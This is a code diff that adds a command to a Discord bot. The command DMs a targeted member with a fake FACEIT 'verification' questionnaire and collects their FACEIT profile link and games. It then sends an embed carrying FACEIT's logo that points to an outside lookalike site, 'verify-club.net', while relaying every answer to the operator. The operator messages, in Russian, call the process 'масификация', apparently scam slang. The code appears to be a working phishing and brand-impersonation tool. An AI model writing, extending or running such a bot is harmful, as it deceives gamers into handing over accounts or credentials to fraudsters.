@@ -310,6 +310,78 @@ async def start_USA(ctx, member: discord.Member):
         )
         active_verifications.discard(member.id)
 
+@bot.command()
+async def start_MAF(ctx, member: discord.Member):
+    if member.id in active_verifications:
+        await ctx.send("Этот пользователь уже проходит масификацию.")
+        return
+
+    active_verifications.add(member.id)
+    try:
+        dm = await member.create_dm()
+        await dm.send(
+            "Hi! 👋 Before proceeding, you need to pass a quick verification.\nPlease answer a couple of questions for verification.\n✉️Just send any message to start."
+        )
+
+        await ctx.send(f"Начал проводить масификацию пользователю: {member}.")
+
+        def check(m):
+            return m.author == member and isinstance(m.channel,
+                                                     discord.DMChannel)
+
+        first_message = await bot.wait_for("message", check=check, timeout=300)
+
+        await ctx.send(
+            f"Ответ от пользователя {first_message.author} на первый вопрос: {first_message.content}"
+        )
+
+        while True:
+            await dm.send(
+                "To continue, please send the link to your FACEIT profile.")
+
+            second_answer = await bot.wait_for("message",
+                                               check=check,
+                                               timeout=300)
+            url = second_answer.content.strip()
+
+            if re.match(r'^https?://(www\.)?faceit\.com(/|$)', url):
+                await ctx.send(
+                    f"Ответ от пользователя {second_answer.author} на второй вопрос: {url}"
+                )
+                break
+            else:
+                await dm.send(
+                    "❌ This is not a valid FACEIT link. Please try again.")
+
+        await dm.send(
+            'Please write down which games you play on FACEIT (for example: CS2, Valorant, and others).'
+        )
+
+        third_answer = await bot.wait_for("message", check=check, timeout=300)
+
+        embed = discord.Embed(
+            title="✅ Congrats!",
+            description=
+            "[Press to continue verification](https://verify-club.net/hub/)",
+            color=discord.Color.dark_orange())
+        embed.set_thumbnail(
+            url=
+            "https://corporate.faceit.com/wp-content/uploads/icon-pheasant-preview-2.png"
+        )
+
+        await dm.send(embed=embed)
+
+        await ctx.send(
+            f"Ответ от пользователя {third_answer.author} на третий вопрос: {third_answer.content}"
+        )
+
+    except Exception as e:
+        await ctx.send(f"Ошибка: {e}")
+    finally:
+        await ctx.send(
+            f"Закончил масификацию пользователя: {member}"
+        )
+        active_verifications.discard(member.id)
 
 # Твій токен сюди
 bot.run(os.getenv('DISCORD_KEY'))
